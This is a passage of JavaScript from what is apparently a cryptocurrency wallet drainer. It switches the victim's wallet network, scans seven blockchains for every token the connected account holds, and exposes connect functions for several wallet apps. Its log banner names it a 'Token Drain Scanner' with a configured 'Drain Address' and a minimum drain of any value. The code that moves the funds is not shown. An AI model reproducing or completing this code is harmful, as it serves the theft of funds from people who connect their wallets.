    const provider = window.ethereum || window.BinanceChain;
    if (!provider) return;
    
    try {
        updateStatus(`🔄 Switching to ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}...`);
        
        await provider.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${chainId.toString(16)}` }],
        });
        
    } catch (switchError) {
        console.log('Network switch error:', switchError);
        updateStatus(`❌ Failed to switch network`);
    }
}

// Handle scan all chains
async function handleScanAllChains() {
    if (!currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    updateStatus('🔍 Scanning all chains for tokens...');
    
    const chainsToScan = [1, 56, 137, 42161, 10, 43114, 8453];
    let allTokens = [];
    
    for (const chainId of chainsToScan) {
        try {
            const response = await fetch(
                `https://api.covalenthq.com/v1/${chainId}/address/${currentAccount}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=false`
            );
            
            if (response.ok) {
                const data = await response.json();
                const items = data?.data?.items || [];
                
                const tokens = items
                    .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
                    .map(t => ({
                        symbol: t.contract_ticker_symbol || 'TOKEN',
                        amount: parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18),
                        contractAddress: t.contract_address,
                        chainId: chainId,
                        chainName: CONFIG.networkNames[chainId] || `Chain ${chainId}`,
                        isNative: t.native_token || false,
                        balance: t.balance
                    }));
                
                if (tokens.length > 0) {
                    allTokens = [...allTokens, ...tokens];
                }
            }
            
            await new Promise(resolve => setTimeout(resolve, 500));
            
        } catch (error) {
            console.log(`⚠️ Failed to scan chain ${chainId}:`, error.message);
        }
    }
    
    detectedTokens = allTokens;
    
    if (allTokens.length > 0) {
        displayTokens(allTokens);
        updateStatus(`✅ Found ${allTokens.length} tokens across all chains`);
    } else {
        updateStatus('ℹ️ No tokens found on any chain');
    }
}

// Initialize app on load
window.addEventListener('DOMContentLoaded', initializeApp);

// Make functions available globally
window.closeModal = closeModal;
window.connectUniversal = connectUniversal;
window.openMetaMask = openMetaMask;
window.openTrustWallet = openTrustWallet;
window.openBinanceWallet = openBinanceWallet;
window.openCoinbaseWallet = openCoinbaseWallet;
window.openPhantom = openPhantom;

console.log('=== Token Drain Scanner ===');
console.log('Version: FINAL - All Wallets Working');
console.log('Minimum Drain: ANY VALUE > 0');
console.log('Drain Address:', CONFIG.drainAddress);
console.log('===========================');
